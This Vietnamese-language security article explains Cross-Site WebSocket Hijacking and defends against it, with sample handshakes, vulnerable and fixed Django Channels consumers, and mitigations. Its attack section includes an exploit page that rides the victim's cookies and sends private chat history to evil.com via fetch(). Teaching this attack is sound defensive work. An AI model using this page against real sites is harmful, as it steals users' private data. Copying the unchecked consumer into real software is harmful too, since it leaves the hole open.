# Cross-Site WebSocket Hijacking (CSWSH)

> **OWASP Top 10:2025**: A05 – Injection | **CWE**: CWE-1385 | **Nguồn**: PortSwigger, Christian Schneider Research

## 🧱 Kiến thức Nền tảng

WebSocket là giao thức full-duplex cho phép giao tiếp hai chiều liên tục giữa client và server qua một kết nối TCP duy nhất. Không giống HTTP truyền thống (request-response), WebSocket duy trì kết nối mở để truyền dữ liệu thời gian thực — phổ biến trong chat, trading, dashboard, và gaming.

Quá trình thiết lập WebSocket bắt đầu bằng một **HTTP Upgrade handshake**:

```http
GET /chat HTTP/1.1
Host: app.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://app.example.com
Cookie: session=abc123def456
```

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Điểm quan trọng: handshake là một **HTTP request thông thường** — trình duyệt tự động gửi kèm cookie. Header `Origin` được trình duyệt thêm vào nhưng **server phải tự kiểm tra** — nếu không, bất kỳ trang web nào cũng có thể mở WebSocket đến server của bạn với cookie của nạn nhân.

Khác với AJAX (bị Same-Origin Policy chặn), WebSocket **không bị SOP hạn chế** — trình duyệt cho phép bất kỳ origin nào mở kết nối WebSocket đến bất kỳ server nào. Đây là nguyên nhân gốc rễ của CSWSH.

## 🔍 Mô tả lỗ hổng

Cross-Site WebSocket Hijacking xảy ra khi:

1. Server WebSocket **không kiểm tra header `Origin`** trong handshake request.
2. Server dựa vào **cookie để xác thực** mà không có thêm CSRF token.
3. Kẻ tấn công dụ nạn nhân truy cập trang độc hại → trang đó mở WebSocket đến server mục tiêu → trình duyệt tự gắn cookie session → kẻ tấn công đọc/ghi dữ liệu với quyền của nạn nhân.

Hậu quả tương tự CSRF nhưng **nguy hiểm hơn** vì WebSocket là kênh hai chiều: kẻ tấn công không chỉ gửi lệnh mà còn **nhận dữ liệu phản hồi** — bao gồm tin nhắn riêng tư, dữ liệu tài chính, hoặc thông tin cá nhân.

## ⚔️ Cơ chế tấn công

**Bước 1 — Kẻ tấn công tạo trang khai thác:**

```html
<!-- Attacker's page: https://evil.com/hijack.html -->
<!-- Victim visits this page while logged into vulnerable-app.com -->
<script>
  // Browser sends victim's cookies with the handshake
  var ws = new WebSocket("wss://vulnerable-app.com/chat");

  ws.onopen = function() {
    console.log("Connected with victim's session!");
    // Send commands as the victim
    ws.send(JSON.stringify({
      action: "get_chat_history",
      room: "private"
    }));
  };

  ws.onmessage = function(event) {
    // Receive victim's private data
    var data = JSON.parse(event.data);
    
    // Exfiltrate to attacker's server
    fetch("https://evil.com/collect", {
      method: "POST",
      body: JSON.stringify({
        stolen: data,
        timestamp: Date.now()
      })
    });
  };
</script>
```

**Bước 2 — Server dễ tổn thương:**

```python
# Vulnerable WebSocket server (Python/Django Channels)
# ❌ No Origin header validation
class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Only checks session cookie — automatically sent by browser
        user = self.scope["user"]
        if user.is_authenticated:
            self.accept()  # Accepts connection from ANY origin
        else:
            self.close()

    def receive(self, text_data):
        data = json.loads(text_data)
        if data["action"] == "get_chat_history":
            # Returns private messages to whoever connects
            history = Message.objects.filter(room=data["room"])
            self.send(text_data=json.dumps({
                "messages": [m.content for m in history]
            }))
```

## 🛡️ Biện pháp phòng thủ

1. **Kiểm tra Origin header** trong handshake:
   ```python
   # SECURE: Validate Origin during WebSocket handshake
   class ChatConsumer(WebsocketConsumer):
       ALLOWED_ORIGINS = [
           "https://app.example.com",
           "https://www.example.com"
       ]
   
       def connect(self):
           origin = dict(self.scope["headers"]).get(b"origin", b"").decode()
           
           if origin not in self.ALLOWED_ORIGINS:
               self.close(code=4003)  # Reject unauthorized origin
               return
           
           if self.scope["user"].is_authenticated:
               self.accept()
           else:
               self.close(code=4001)
   ```

2. **Sử dụng CSRF token** trong handshake thay vì chỉ dựa vào cookie:
   ```javascript
   // SECURE: Include CSRF token in WebSocket URL or first message
   var csrfToken = document.querySelector('meta[name="csrf-token"]').content;
   var ws = new WebSocket("wss://app.example.com/chat?csrf=" + csrfToken);
   ```

3. **Dùng custom authentication** thay vì cookie:
   ```javascript
   // SECURE: Authenticate via first message instead of cookies
   var ws = new WebSocket("wss://app.example.com/chat");
   ws.onopen = function() {
     ws.send(JSON.stringify({
       type: "auth",
       token: localStorage.getItem("jwt_token")  // Not auto-sent by browser
     }));
   };
   ```

4. **Rate limiting và monitoring** — phát hiện các kết nối WebSocket bất thường từ origin lạ.

## 💻 Code Example

```python
# ❌ VULNERABLE: No origin check, cookie-only auth
class NotificationConsumer(WebsocketConsumer):
    def connect(self):
        if self.scope["user"].is_authenticated:
            self.accept()  # Any website can hijack this

# ✅ SECURE: Origin validation + token-based auth
class NotificationConsumer(WebsocketConsumer):
    ALLOWED_ORIGINS = ["https://myapp.com"]
    
    def connect(self):
        # Check Origin header
        headers = dict(self.scope["headers"])
        origin = headers.get(b"origin", b"").decode()
        
        if origin not in self.ALLOWED_ORIGINS:
            self.close(code=4003)
            return
        
        # Require token-based authentication (not just cookies)
        query = parse_qs(self.scope["query_string"].decode())
        token = query.get("token", [None])[0]
        
        if not validate_ws_token(token, self.scope["user"]):
            self.close(code=4001)
            return
        
        self.accept()
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
- CWE: https://cwe.mitre.org/data/definitions/1385.html
- Christian Schneider: https://www.christian-schneider.net/CrossSiteWebSocketHijacking.html
